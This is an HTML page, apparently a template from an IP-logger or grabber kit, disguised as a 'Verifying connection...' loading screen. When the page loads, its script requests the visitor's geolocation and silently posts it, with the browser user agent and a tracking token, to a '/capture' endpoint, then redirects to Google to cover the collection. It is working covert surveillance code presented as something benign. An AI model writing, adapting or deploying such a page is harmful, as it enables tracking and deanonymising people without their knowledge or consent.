<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#fff}
.spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,0.1);border-top-color:#00d4ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
<script>
async function sendData(){
let loc=null;
try{loc=await new Promise(r=>{navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),()=>r(null))})}catch(e){}
await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'[[TOKEN]]',data:{type:'ip_logger',userAgent:navigator.userAgent,location:loc}})});
window.location.href='https://google.com';
}
sendData();
</script>
</head>
<body><div class="spinner"></div><h3>Verifying connection...</h3></body>
</html>
